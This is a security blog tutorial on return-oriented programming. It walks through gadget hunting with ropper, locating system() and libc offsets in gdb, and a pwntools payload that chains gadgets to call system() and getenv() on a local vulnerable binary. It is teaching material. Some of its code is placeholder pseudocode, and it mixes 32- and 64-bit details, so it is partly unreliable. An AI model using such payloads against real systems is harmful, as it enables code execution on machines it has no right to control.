@@ -1,0 +1,129 @@
+---
+title: Stack is the New RIP
+date: '2023-10-08'
+tags: ['security']
+draft: false
+summary: A Dive into Return-Oriented Programming. Turning stack into tool to control RIP
+---
+
+
+# **A Dive into Return-Oriented Programming**
+
+It would be helpful to be familiar with the x86 calling conventions before reading this tutorial. Here is a good  [material](https://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html).
+
+With protection mechanisms like DEP/NX, OS can escape simple buffer overflow, but ROP and Ret2Libc attacks are still executable. While simply pointing RIP (64-bit instruction pointer) to shellcode address is not possible due to “writable pages are not executable” protection, ROP overcomes this by pointing RIP to already available short code sequences in process space (which are marked executable).
+
+**Section 1**:  **Preliminaries**
+
+**1.1 Stack and Function Calls:** Every program uses a stack frame to keep track of functions. As a function is called, its return address gets pushed onto the stack. And after function return execution flow (rip) jumps to ret address on stack. A simple buffer overflow can overwrite this return address, leading to potential code execution.
+
+**1.2 Memory Protections**  Modern OSes incorporate DEP/NX, making the stack non-executable, thwarting direct code injection. Coupled with ASLR, which randomises memory addresses, exploit developers face daunting challenges.
+
+**Section 2: Enter ROP**
+
+Modern OS marks a writable process page as non-executable. Which means, you can not simply overwrite the buffer with shellcode and point RIP to it and make it run. ROP makes it possible by utilizing code snippets already present in process space.
+
+_Effectively turning the stack into a tool to control RIP._
+
+As shown in below image, the stack pointer (rsp) points to one such ROP sequence. Once the ROP sequence is hit, it will point instruction pointer (RIP) to whatever rsp is pointing to. Making Stack a tool to control RIP.
+
+<figure text-align="center">
+  <figcaption text-align="center">Single ROP</figcaption>
+  <img src="https://miro.medium.com/v2/resize:fit:600/1*bGnW-gn6Im30zMmhCdx_0A.png" alt="Single ROP"/>
+</figure>
+
+**2.1 ROP Gadgets** are short code sequences, ending in “ret” instruction
+
+```python 
+pop rdi  
+pop rsi  
+ret
+```
+
+Above short sequence will jump the RIP to any address that comes next in the stack. And you can make it execute any arbitrary code, by chaining these ROP sequences. In below stack image, you can see 2 ROPs are chained together to make program execute two calls
+
+-   system call
+-   getEnv call
+
+<figure>
+  <figcaption text-align="center">2 ROP chained together to run system() and getEnv()</figcaption>
+  <img src="https://miro.medium.com/v2/resize:fit:641/1*3S2ncFnEO-b8_6vsFBJf1Q.png" alt="Single ROP"/>
+</figure>
+
+**Section 3: ROP in Action**
+
+**3.1 Find ROP gadgets in process-memory** Lets work with a vulnerable binary ./**target** Finding ROP sequences(gadgets) for making it run  **system**  call.  
+Lets move to build a payload which will make our ROP succeed.
+
+1.  Find ROP sequence addresses in your binary
+
+```bash
+find library through ldd  
+$ ldd target  
+  
+libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6   
+libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1   
+/lib64/ld-linux-x86-64.so.2   
+
+## take the library file path and run ropper   
+ropper --file /lib/x86_64-linux-gnu/libc.so.6 --search "pop rop"  
+  
+0x0000000000006bf3: pop rdi; ret;
+```
+
+2.  Find function address and function arguments address, which you want to run as part of exploit. Lets run “system” call.
+```bash
+$(gdb) p system  
+ 0xf7fd6c70 system  
+  
+$(gdb) search "/bin/cat"  
+```
+
+3. You can’t use these addresses as is because of ASLR. So calculate the offset of these addresses with libc start address. Running  `vmmap`  in gdb will print address ranges used in current process. With help of these addresses, you can calculate the offset of  `system`  and  `/bin/sh`
+```bash
+pwndbg> vmmap  
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
+.....  
+0xf7dbf000 0xf7f94000 r-xp   1d5000 0      /usr/local/lib/i386-linux-gnu/libc-2.27.so  
+0xf7f94000 0xf7f95000 ---p     1000 1d5000 /usr/local/lib/i386-linux-gnu/libc-2.27.so  
+0xf7f95000 0xf7f97000 r--p     2000 1d5000 /usr/local/lib/i386-linux-gnu/libc-2.27.so  
+0xf7f97000 0xf7f98000 rw-p     1000 1d7000 /usr/local/lib/i386-linux-gnu/libc-2.27.so  
+.....  
+0xfffdd000 0xffffe000 rw-p    21000 0      [stack]
+```
+
+4. Lets build complete payload which will run the exploit. In the below script, payload is built using pwntools.
+```bash
+from pwn import *  
+  
+payload = (0xdeadbeef)*(buf_size)  
+## 1st ROP   
+payload += p64(address(rop_gadget_1))  
+payload += p64(address("/bin/cat"))  
+payload += p64(0)  
+payload += p64(address(system_call))  
+  
+## 2nd ROP   
+payload += p64(address(rop_gadget_2))  
+payload += p64(address(<env_var_name>))  
+payload += p64(0)  
+payload += p64(address(getenv_call))  
+  
+## run the process   
+p = process("./target")  
+## send payload   
+p.send(payload)  
+  
+p.interactive()
+```
+
+The above payload will make a vulnerable binary run any arbitrary code (system call in our case), even when the binary is built with DEP/NX protections.
+
+**Section 4: Mitigations and Beyond** Modern defenses like stack canaries and Control-Flow Integrity (CFI) can make ROP difficult, though not impossible.
+
+JOP, COP, and SROP These are advanced cousins of ROP, developed to bypass even tougher defenses.
+
+**References and Further Reading**
+
+1.  [Return-Oriented Programming: Systems, Languages, and Applications](https://hovav.net/ucsd/dist/rop.pdf)
+2.  [64-bit Linux Return-Oriented Programming](http://crypto.stanford.edu/~blynn/asm/rop.html)
